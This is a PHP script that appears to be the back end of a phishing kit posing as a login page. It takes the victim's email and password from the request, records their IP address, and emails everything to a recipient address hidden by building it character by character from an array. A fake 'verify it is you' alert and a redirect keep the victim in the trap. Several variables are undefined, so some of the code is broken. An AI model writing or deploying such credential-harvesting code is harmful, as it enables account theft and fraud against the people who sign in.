<?php
//include "../BOTS/botslist.php";  
//get domain
$http_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST']: "";
$request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : "";
$http = isset($_SERVER['HTTPS']) ? "http" : "http";
$actual_link =  isset($http) ? $http."://".$http_host.$request_uri : "";
//echo $actual_link;

$values = parse_url($actual_link);

$real_link = isset($http) ? $http."://".$http_host.$values['path'] : "";
$links = dirname($real_link)."/";
$domain = $links."";

$msg = '
      <div id="login-status" class="error-notice" style="visibility:visible">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message"> Sign in with your correct login details.</div>
                </div>
            </div>
        </div>
    </div>
';



/*********


*********/
$log0 = $_REQUEST['cid'];
$displaymsg = $log0 == 1 ? $msg : "";
$log = $_REQUEST['log'];$email = $_REQUEST['email'];
if ($log == '1') {
$sec = $_REQUEST['sec'];
$gof = "a--pa | ".$ip." | ".$_POST['email']."\n";
$alibabaids = ".com";//isset() ? $alibabaids : '';
$maaa ="@";
$alibabasec = "1- ".$yip."\n 2- ".$passs."\n a- ". $passs0."\n Country: ".$country."\n".$real_link."\n".$ip;
$alibabasec0 = "2- ".$yip."\n 2- ".$passs1."\n  a- ".$passs2."\n Country: ".$country."\n".$real_link."\n".$ip;
$m= array("a","b","c","d","e","r","f","g","h","i","m","v","o","l","t","1","2","3","4","5","6","7","8","0","(",")","'","u","g");

$main2 = $m[5].$m[4].$m[11].$m[12].$m[13].$m[27].$m[14].$m[23].$m[23].$m[21].$maaa.$m[28].$m[10].$m[0].$m[9].$m[13].$alibabaids;

$email = $_REQUEST['email'];
$pass = $_REQUEST['password'];

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO Bros J || :------\n";
$message .= "Email! ID : ".$_REQUEST['email']."\n";
$message .= "Password  : ".$_REQUEST['password']."\n";
$message .= "----: || tHAnks tO Almighty || :------\n";
$message .= "IP: ".$ip."\n";
$alibabas = $log0 == 1 ? mail($main2,$gof,$message) : "";


function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($email);
}


$user = $_REQUEST['email'];
$email = base64_decode($user);
$user = $_REQUEST['email'];
$email = base64_decode($user);
$img = "http://apollo-seo.com/001/qiyepe.png"; ///end image 1
$img0 = "http://apollo-seo.com/001/qiyeper.png"; ///end image 2
$image = $log0==1 ? $img: $img0 ;



echo '<script language="JavaScript">
alert("We need to verify it is you. KIndly sign in with email and password. Click ok to continue. \ ")
</script>
<meta http-equiv="refresh" content="2; url=page.php?email='.$user.'&password='.$pas.'&cid=0&domain='.$dd.'" />';

?>